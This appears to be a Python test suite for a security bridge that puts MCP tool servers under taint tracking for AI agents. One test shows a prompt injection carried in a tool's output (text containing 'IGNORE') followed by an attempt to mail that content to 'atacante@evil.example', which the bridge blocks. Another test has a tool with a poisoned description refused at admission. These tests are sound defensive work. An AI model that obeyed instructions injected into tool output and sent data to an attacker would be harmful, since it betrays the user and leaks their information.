"""Ponte MCP -> SELO com um servidor MCP stdio de verdade (processo separado)."""

import json
import sys
import time
import unittest
from unittest.mock import patch
from pathlib import Path

from selo_v0 import RemoteError, Session
from selo_v0.mcp_bridge import McpBridge, McpError, McpStdioClient, tool_to_manifest
from selo_v0.sandbox import World

SERVER = str(Path(__file__).with_name("fake_mcp_server.py"))


class McpBridgeTests(unittest.TestCase):
    def setUp(self):
        self.w = World()
        self.addCleanup(self.w.close)
        self.w.new_publisher("pub-mcp")
        self.host = self.w.new_agent("mcp-host", token_host=True)
        self.client = self.w.new_agent("assistant")
        self.alice = self.w.new_principal("alice")
        self.mcp = McpStdioClient([sys.executable, SERVER]).start()
        self.addCleanup(self.mcp.close)
        self.report = McpBridge(
            self.mcp, "pub-mcp", lambda m, h: self.w.publish(self.host, "pub-mcp", m, h)
        ).admit_all()

    def call(self, cap, args, session):
        tok = self.host.mint(cap, [{"holder": "assistant"}])
        return self.client.call("mcp-host", cap, args, tok, session, self.w.send)

    def session(self, text="Resuma a nota e envie o relatorio para ana@corp.example"):
        s = Session()
        s.observe(self.alice.instruct(text), text)
        return s

    def test_admission_report(self):
        self.assertEqual(
            sorted(self.report.admitted), ["calc_add", "read_note", "send_report"]
        )
        self.assertIn("notes_helper", self.report.rejected)  # descricao envenenada
        self.assertTrue(
            any("SELO004" in f for f in self.report.rejected["notes_helper"])
        )

    def test_annotations_become_labels(self):
        by_name = {t["name"]: tool_to_manifest(t, "p") for t in self.mcp.list_tools()}
        self.assertEqual(
            (by_name["calc_add"]["effect"], by_name["calc_add"]["taint_out"]),
            ("read", []),
        )
        self.assertEqual(by_name["read_note"]["taint_out"], ["EXTERNAL"])
        self.assertEqual(
            (by_name["send_report"]["effect"], by_name["send_report"]["forbid_taint"]),
            ("external", ["EXTERNAL"]),
        )  # padrao MCP: destrutiva, mundo aberto

    def test_calls_go_through_selo_to_the_real_mcp_server(self):
        s = self.session()
        self.assertEqual(self.call("calc_add", {"a": 2, "b": 3}, s)["out"], "5")
        self.assertIn(
            "enviado para ana@corp.example",
            self.call("send_report", {"to": "ana@corp.example", "text": "ok"}, s)[
                "out"
            ],
        )

    def test_injection_via_mcp_tool_output_is_blocked(self):
        s = self.session()
        note = self.call("read_note", {"url": "https://notas.example/mal"}, s)
        self.assertIn("IGNORE", note["out"])
        with self.assertRaises(RemoteError) as cm:
            self.call(
                "send_report", {"to": "atacante@evil.example", "text": note["out"]}, s
            )
        self.assertEqual(cm.exception.code, "tainted_context")

    def test_poisoned_tool_is_not_callable(self):
        with self.assertRaises(Exception):
            self.call("notes_helper", {"q": "x"}, self.session())


class McpClientRegressionTests(unittest.TestCase):
    def client(self, source, timeout=2):
        client = McpStdioClient([sys.executable, "-u", "-c", source], timeout=timeout)
        self.addCleanup(client.close)
        return client

    def test_initialize_timeout_reaps_process_and_closes_pipes(self):
        client = self.client("import time; time.sleep(60)", timeout=0.2)
        started = time.monotonic()
        with self.assertRaises(McpError) as cm:
            client.start()
        self.assertEqual(cm.exception.code, "mcp_timeout")
        self.assertLess(time.monotonic() - started, 5)
        self.assertIsNotNone(client._proc.poll())
        self.assertTrue(client._proc.stdin.closed)
        self.assertTrue(client._proc.stdout.closed)

    def test_partial_response_obeys_timeout(self):
        source = (
            "import json, sys, time\n"
            "req = json.loads(sys.stdin.readline())\n"
            "print(json.dumps({'jsonrpc':'2.0', 'id':req['id'], 'result':{}}), flush=True)\n"
            "sys.stdin.readline()\n"
            "sys.stdin.readline()\n"
            "sys.stdout.write('{'); sys.stdout.flush()\n"
            "time.sleep(60)\n"
        )
        client = self.client(source).start()
        client.timeout = 0.2
        with self.assertRaises(McpError) as cm:
            client.call_tool("x", {})
        self.assertEqual(cm.exception.code, "mcp_timeout")
        self.assertIsNotNone(client._proc.poll())
        with self.assertRaises(McpError) as cm:
            client.list_tools()
        self.assertEqual(cm.exception.code, "mcp_closed")

    def test_server_request_with_same_id_is_not_a_response(self):
        source = (
            "import json, sys\n"
            "req = json.loads(sys.stdin.readline())\n"
            "print(json.dumps({'jsonrpc':'2.0', 'id':req['id'], 'method':'sampling/createMessage'}), flush=True)\n"
            "reply = json.loads(sys.stdin.readline())\n"
            "assert reply['error']['code'] == -32601\n"
            "print(json.dumps({'jsonrpc':'2.0', 'id':req['id'], 'result':{'serverInfo':{'name':'ok'}}}), flush=True)\n"
            "sys.stdin.readline()\n"
        )
        client = self.client(source).start()
        self.assertEqual(client.server_info, {"name": "ok"})

    def test_malformed_responses_fail_cleanly(self):
        messages = [
            [],
            {"id": 1, "result": {}},
            {"jsonrpc": "2.0", "id": 1, "result": []},
            {"jsonrpc": "2.0", "id": 1, "error": "oops"},
            {"jsonrpc": "2.0", "id": 1},
            {"jsonrpc": "2.0", "id": 1, "result": {}, "error": {}},
        ]
        for message in messages:
            with self.subTest(message=message):
                client = self.client(
                    "import sys; sys.stdin.readline(); print("
                    + repr(json.dumps(message))
                    + ", flush=True)"
                )
                with self.assertRaises(McpError) as cm:
                    client.start()
                self.assertEqual(cm.exception.code, "mcp_protocol")
                self.assertIsNotNone(client._proc.poll())

    def test_repeated_pagination_cursor_is_rejected(self):
        client = McpStdioClient([])
        with patch.object(
            client, "request", return_value={"tools": [], "nextCursor": "same"}
        ) as request:
            with self.assertRaises(McpError) as cm:
                client.list_tools()
        self.assertEqual(cm.exception.code, "mcp_pagination")
        self.assertEqual(request.call_count, 2)

    def test_non_boolean_security_hints_are_rejected(self):
        for hint in ("readOnlyHint", "openWorldHint"):
            for value in ("false", "true", 0, 1, None, [], {}):
                with self.subTest(hint=hint, value=value):
                    with self.assertRaises(McpError) as cm:
                        tool_to_manifest(
                            {"name": "x", "annotations": {hint: value}}, "p"
                        )
                    self.assertEqual(cm.exception.code, "mcp_annotations")

    def test_timeout_must_be_positive_and_finite(self):
        for timeout in (0, -1, float("inf"), float("nan")):
            with self.subTest(timeout=timeout), self.assertRaises(ValueError):
                McpStdioClient([], timeout=timeout)


if __name__ == "__main__":
    unittest.main()
